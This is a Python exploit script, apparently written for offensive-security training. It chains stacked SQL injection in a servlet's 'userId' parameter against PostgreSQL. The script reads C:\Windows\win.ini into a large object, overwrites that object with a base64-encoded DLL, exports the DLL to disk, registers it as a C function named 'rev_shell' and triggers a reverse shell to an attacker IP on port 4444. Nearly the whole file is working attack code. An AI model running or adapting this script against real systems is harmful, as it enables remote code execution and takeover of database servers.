import base64
import requests

# Burp Suite proxy configuration
proxy = {
    'http': 'http://127.0.0.1:8080',  # Replace with your Burp Suite proxy address
    'https': 'http://127.0.0.1:8080'  # Replace with your Burp Suite proxy address
}
requests.packages.urllib3.disable_warnings()

def make_request(url, sql):
    print("[*] Executing query: %s" % sql[0:80])
    payload = {
       'ForMasRange': '1',
       'userId':'1;'+sql+';--'
    }
    r = requests.post( url, data=payload, proxies=proxy, verify=False)#make it a POST for bigger requests
    return r

def convert_dll_to_base64(file_path):
    with open(file_path, 'rb') as dll_file:
        dll_content = dll_file.read()
        base64_content = base64.b64encode(dll_content).decode('utf-8')
        return base64_content

def save_base64_to_file(base62_content, output_file):
    with open(output_file, 'w') as output:
        output.write(base64_content)

def create_dll(url,base64_content):
    print("[+] Creating  DLL on victim's machine...")
    sql = "copy+(select+convert_from(decode($$%s$$,$$base64$$),$$utf-8$$))+to+$$C:\\decoded.dll$$;--" % base64_content
    make_request(url, sql)

def test_pgsleep(url):
    sql ="select pg_sleep(5)"
    make_request(url, sql)

def create_lo(url, loid):
    print("[+] Creating LO for UDF injection...")
    sql = "SELECT lo_import($$C:\\Windows\\win.ini$$,%d)" % loid
    #\lo_list
    make_request(url, sql)

def unlink_lo(url):
    sql ="SELECT lo_unlink(1337)"
    make_request(url, sql)

def save_chunks_base64(url,file_path,loid):
    #for Postges pre 9.2  - has not been fully tested
    #chunk_size = 2048
    chunk_size = 2000
    file_counter = 1
    sql = ''
    with open(file_path, 'rb') as file:
        while True:
            chunk = file.read(chunk_size)
            if not chunk:
                break
            encoded_chunk = base64.b64encode(chunk)
            #encoded_chunk = chunk
            with open(f'chunk_{file_counter}.txt', 'wb') as output_file:
                output_file.write(encoded_chunk)
            if file_counter == 1:
                sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$base64$$) where loid=%d and pageno=%d" % (encoded_chunk.decode('utf-8'), loid, file_counter-1)
            else:
                sql = "INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (%d, %d,decode($$%s$$, $$base64$$))" % (loid, file_counter-1, encoded_chunk.decode('utf-8'))
        
            make_request(url, sql)
            print(sql)
            file_counter += 1
def save_base64(url,file_path,loid):
    #Postges 9.2 allows large objects larger than 2k
    #chunk_size = 2048
    chunk_size = 4000
    file_counter = 1
    sql = ''
    with open(file_path, 'rb') as file:
        chunk = file.read()
        encoded_chunk = base64.b64encode(chunk)
        sql = "UPDATE PG_LARGEOBJECT SET data=decode($$%s$$, $$base64$$) where loid=%d and pageno=%d" % (encoded_chunk.decode('utf-8'), loid, file_counter-1)
        make_request(url, sql)
def export_udf(url,file, loid):
    print("[+] Exporting UDF library to filesystem...")
    sql = "SELECT lo_export(%d, $$%s$$)" % (loid,file)
    make_request(url, sql)

def create_udf_func(url,file):
    print("[+] Creating function...")
    sql = "create or replace function rev_shell(text, integer) returns VOID as $$%s$$, $$awae$$ language C strict" % file
    #SAMBA file server
    #sql = "create or replace function rev_shell(text, integer) returns VOID as $$\\192.xxx.xxx.197\awae\rev_shell_to_nc.dll$$, $$awae$$ language C strict"
    make_request(url, sql)

def trigger_udf(url, ip, port):
    print("[+] Launching reverse shell...")
    sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
    make_request(url, sql)

dll_file_path = '/home/kali/awae/rev_shell_to_nc.dll'
#test_pgsleep(url)
url = 'https://xxx:8443/servlet/xxxxxServlet'
dll_file = 'C:\\rev_shell_to_nc.dll'#save to c drive for eazy-e access
unlink_lo(url) #unlink it to make sure it does not exist
create_lo(url,1337) #create temp large object with c:\windows\win.ini <- AssUming its there
save_base64(url,dll_file_path,1337) #save .dll to large object
export_udf(url,dll_file,1337) # save large object to local file
create_udf_func(url,dll_file)
trigger_udf(url, '192.168.45.197', 4444)



